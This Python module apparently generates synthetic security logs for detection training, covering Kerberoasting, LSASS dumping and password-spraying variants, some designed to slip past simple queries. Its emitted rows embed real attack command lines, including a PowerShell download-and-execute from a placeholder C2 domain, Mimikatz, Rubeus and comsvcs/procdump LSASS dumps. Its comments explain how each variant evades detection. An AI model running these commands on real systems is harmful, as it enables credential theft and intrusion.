"""Credential access emitters."""
from __future__ import annotations

from datetime import timedelta
from typing import Iterator

from .. import rows
from .base import EmitContext, Variant, dwell, loud_scale, register

# ── T1558.003 Kerberoasting ──────────────────────────────────────────────
#
# The variant set is the whole lesson. The first three differ only in tooling
# and are what most write-ups describe. The last three exist to break the query
# an analyst writes after seeing the first three:
#
#   targeted   -> one 4769. Defeats every `count() > threshold`.
#   aes_only   -> no RC4 at all. Defeats every `TicketEncryptionType == "0x17"`.
#   slow       -> spread over days. Defeats every fixed time window.
#
# A detection that survives a re-roll has to reason about *which* accounts are
# requesting *which* SPNs, not about volume or encryption type alone.

KERBEROAST_VARIANTS = [
    Variant("rubeus", "Rubeus kerberoast",
            "Burst of 4769 with RC4 (0x17) from one host, unusual parent process",
            "count()-over-threshold queries catch this easily", weight=1.0),
    Variant("powerview", "Invoke-Kerberoast (PowerShell)",
            "4769 burst plus PowerShell execution with .NET assembly load",
            "", weight=1.0),
    Variant("setspn_mimikatz", "setspn.exe enumeration then Mimikatz export",
            "LDAP SPN query, then ticket export hours later - two stages, easy to miss",
            "single-window correlation misses the gap", weight=0.8),
    Variant("targeted", "Targeted single-SPN roast",
            "Exactly ONE 4769 for a high-value service account",
            "defeats count() > threshold entirely", weight=0.9),
    Variant("aes_only", "AES-only roast",
            "Normal-looking AES (0x12) tickets, no RC4 downgrade at all",
            'defeats TicketEncryptionType == "0x17"', weight=0.9),
    Variant("slow", "Slow roast over several days",
            "A handful of 4769 per day, spread across the window",
            "defeats any fixed time-window threshold", weight=0.8),
]


def _roastable_spns(ctx: EmitContext) -> list[str]:
    """SPNs worth roasting — service accounts, not machine accounts."""
    org = ctx.org
    spns = []
    for d in org.devices_by_role("sql"):
        spns.append(f"MSSQLSvc/{d.name.lower()}.{org.domain}:1433")
    for d in org.devices_by_role("web"):
        spns.append(f"HTTP/{d.name.lower()}.{org.domain}")
    for d in org.devices_by_role("app"):
        spns.append(f"HOST/{d.name.lower()}.{org.domain}")
    spns.append(f"MSSQLSvc/{org.domain}:1433")
    return spns or [f"HOST/{org.domain}"]


@register("T1558.003", KERBEROAST_VARIANTS,
          tables=("SecurityEvent", "DeviceProcessEvents"))
def kerberoast(ctx: EmitContext) -> Iterator[dict]:
    org, rng, plan = ctx.org, ctx.rng, ctx.plan
    intr = ctx.intrusion
    host = intr.current_host()
    user = intr.current_user()
    dc = org.domain_controllers[0] if org.domain_controllers else org.servers[0]
    spns = _roastable_spns(ctx)
    variant = plan.variant

    # How many tickets, and in what encryption.
    if variant == "targeted":
        targets = [rng.choice(spns)]
        enc = "0x17"
    elif variant == "aes_only":
        targets = rng.sample(spns, min(len(spns), loud_scale(plan.loudness, 3, 8)))
        enc = "0x12"
    elif variant == "slow":
        targets = rng.sample(spns, min(len(spns), loud_scale(plan.loudness, 4, 10)))
        enc = "0x17"
    else:
        targets = rng.sample(spns, min(len(spns), loud_scale(plan.loudness, 5, 14)))
        enc = "0x17"

    # The tooling that requested them.
    ts = plan.start
    if variant == "rubeus":
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "Rubeus.exe",
            rf"{intr.staging_dir}\Rubeus.exe kerberoast /outfile:{intr.staging_dir}\hashes.txt /nowrap",
            parent="cmd.exe", integrity="Medium"), "Rubeus launched")
    elif variant == "powerview":
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "powershell.exe",
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
            '"IEX (New-Object Net.WebClient).DownloadString(\'http://'
            f'{intr.c2_domain}/pv.ps1\'); Invoke-Kerberoast -OutputFormat Hashcat"',
            parent="cmd.exe"), "Invoke-Kerberoast")
    elif variant == "setspn_mimikatz":
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "setspn.exe",
            f"setspn.exe -T {org.netbios.lower()} -Q */*",
            parent="cmd.exe"), "SPN enumeration stage")

    # The tickets themselves.
    if variant == "slow":
        # Spread across days, a couple at a time — under any daily threshold.
        day = ts
        for i, spn in enumerate(targets):
            if i and i % 2 == 0:
                day += timedelta(days=1, minutes=rng.randint(-120, 120))
            when = day + timedelta(minutes=rng.randint(0, 480))
            yield from ctx.mark(rows.security_kerberos(
                ctx.gen, dc, user, when, event_id=4769, spn=spn,
                encryption=enc, src_ip=host.ip),
                f"slow roast {i + 1}/{len(targets)}")
    else:
        when = ts + timedelta(seconds=rng.randint(2, 30))
        for i, spn in enumerate(targets):
            # A burst: seconds apart, which is what makes it visible at all.
            when += timedelta(seconds=rng.randint(0, 4) if plan.loudness >= 3
                              else rng.randint(5, 90))
            yield from ctx.mark(rows.security_kerberos(
                ctx.gen, dc, user, when, event_id=4769, spn=spn,
                encryption=enc, src_ip=host.ip),
                f"{variant} roast {i + 1}/{len(targets)}")

    # Second stage, hours later — the part a single-window query misses.
    if variant == "setspn_mimikatz":
        later = ts + timedelta(hours=rng.randint(3, 9))
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, later, "mimikatz.exe",
            rf'{intr.staging_dir}\mimikatz.exe "kerberos::list /export" "exit"',
            parent="cmd.exe", integrity="High"), "ticket export stage")


# ── T1003.001 LSASS credential dumping ───────────────────────────────────

LSASS_VARIANTS = [
    Variant("comsvcs", "rundll32 comsvcs.dll MiniDump",
            "rundll32 with comsvcs.dll and MiniDump, writing a .dmp",
            "", weight=1.0),
    Variant("procdump", "Sysinternals procdump -ma lsass.exe",
            "Signed Microsoft binary, legitimate company name in metadata",
            "image-name blocklists miss it; the binary is legitimate", weight=1.0),
    Variant("taskmgr", "Task Manager right-click Create dump file",
            "taskmgr.exe writing lsass.DMP to a user temp folder - no command line at all",
            "defeats every command-line based detection", weight=0.7),
    Variant("mimikatz", "Mimikatz sekurlsa::logonpasswords",
            "Direct memory read, no dump file written to disk",
            "defeats file-creation based detection", weight=0.9),
]


@register("T1003.001", LSASS_VARIANTS,
          tables=("DeviceProcessEvents", "SecurityEvent", "DeviceFileEvents"))
def lsass_dump(ctx: EmitContext) -> Iterator[dict]:
    rng, plan, intr = ctx.rng, ctx.plan, ctx.intrusion
    host = intr.current_host()
    user = intr.current_user()
    ts = plan.start
    dump = rf"{intr.staging_dir}\lsass.dmp"

    if plan.variant == "comsvcs":
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "rundll32.exe",
            f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump "
            f"{rng.randint(600, 900)} {dump} full",
            parent="cmd.exe", integrity="High"), "LSASS minidump via comsvcs")
        yield from ctx.mark(rows.device_file_event(
            ctx.gen, host, user, ts + timedelta(seconds=3), filename="lsass.dmp",
            folder=dump, action="FileCreated", process="rundll32.exe",
            size=rng.randint(40_000_000, 90_000_000)), "dump written")

    elif plan.variant == "procdump":
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "procdump64.exe",
            rf"{intr.staging_dir}\procdump64.exe -accepteula -ma lsass.exe {dump}",
            parent="cmd.exe", integrity="High",
            # Genuinely signed by Microsoft — that is the point of the variant.
            ProcessVersionInfoCompanyName="Microsoft Corporation",
            ProcessVersionInfoProductName="Sysinternals ProcDump"),
            "LSASS dump via signed Sysinternals binary")
        yield from ctx.mark(rows.device_file_event(
            ctx.gen, host, user, ts + timedelta(seconds=6), filename="lsass.dmp",
            folder=dump, action="FileCreated", process="procdump64.exe",
            size=rng.randint(40_000_000, 90_000_000)), "dump written")

    elif plan.variant == "taskmgr":
        # No command line worth matching: the operator used the GUI.
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "Taskmgr.exe", "Taskmgr.exe /4",
            parent="explorer.exe", integrity="High"), "Task Manager opened")
        yield from ctx.mark(rows.device_file_event(
            ctx.gen, host, user, ts + timedelta(minutes=1), filename="lsass.DMP",
            folder=rf"C:\Users\{user.sam}\AppData\Local\Temp\lsass.DMP",
            action="FileCreated", process="Taskmgr.exe",
            size=rng.randint(40_000_000, 90_000_000)), "GUI dump, no command line")

    else:  # mimikatz — nothing written to disk
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "mimikatz.exe",
            rf'{intr.staging_dir}\mimikatz.exe "privilege::debug" '
            r'"sekurlsa::logonpasswords" "exit"',
            parent="cmd.exe", integrity="High"), "in-memory credential theft")

    # Whatever the method, the attacker now holds another account's credentials.
    admins = [u for u in ctx.org.admins if not u.is_service]
    if admins:
        intr.steal(rng.choice(admins))


# ── T1110.003 Password spraying ──────────────────────────────────────────

SPRAY_VARIANTS = [
    Variant("burst", "Fast spray from one IP",
            "Many accounts, one password, minutes apart, single source IP",
            "", weight=1.0),
    Variant("low_and_slow", "Low and slow spray",
            "A few attempts per hour across days, staying under lockout",
            "defeats failure-count thresholds", weight=1.0),
    Variant("distributed", "Spray from rotating IPs",
            "Same account set, different source IP each attempt",
            "defeats per-IP aggregation", weight=0.9),
    Variant("legacy_auth", "Spray via legacy authentication",
            "Non-interactive sign-ins over IMAP/Exchange ActiveSync, bypassing MFA",
            "invisible to anyone querying only SigninLogs", weight=0.9),
]


@register("T1110.003", SPRAY_VARIANTS,
          tables=("SigninLogs", "AADNonInteractiveUserSignInLogs"))
def password_spray(ctx: EmitContext) -> Iterator[dict]:
    from ..benign.identity import _signin_row

    rng, plan, org = ctx.rng, ctx.plan, ctx.org
    intr = ctx.intrusion
    n_targets = loud_scale(plan.loudness, 12, 60)
    targets = rng.sample(org.humans, min(len(org.humans), n_targets))
    src_ip = intr.c2_ip
    ts = plan.start

    legacy = plan.variant == "legacy_auth"
    table = "AADNonInteractiveUserSignInLogs" if legacy else "SigninLogs"

    for i, target in enumerate(targets):
        if plan.variant == "low_and_slow":
            ts += timedelta(minutes=rng.randint(25, 90))
        elif plan.variant == "burst":
            ts += timedelta(seconds=rng.randint(4, 40))
        else:
            ts += timedelta(seconds=rng.randint(20, 180))

        if plan.variant == "distributed":
            src_ip = (f"{rng.choice([45, 91, 104, 185, 194])}.{rng.randint(1, 254)}."
                      f"{rng.randint(1, 254)}.{rng.randint(1, 254)}")

        # One account in the set has the sprayed password — the interesting one.
        success = (i == len(targets) // 3)
        row = _signin_row(ctx.gen, table, ts, target, not legacy)
        row.update({
            "ResultType": "0" if success else "50126",
            "ResultDescription": "" if success else
                "Invalid username or password or Invalid on-premise username or password.",
            "IPAddress": src_ip,
            "ClientAppUsed": "Other clients" if legacy else "Browser",
            "AuthenticationRequirement": "singleFactorAuthentication",
            "ConditionalAccessStatus": "notApplied" if legacy else "success",
            "LocationDetails": {"city": "Amsterdam", "countryOrRegion": "NL",
                                "state": "Noord-Holland"},
            "Location": "NL",
            "Status": {"errorCode": 0 if success else 50126},
        })
        row["__table"] = table
        yield from ctx.mark(row, "spray success" if success else "spray attempt")
        if success:
            intr.steal(target)
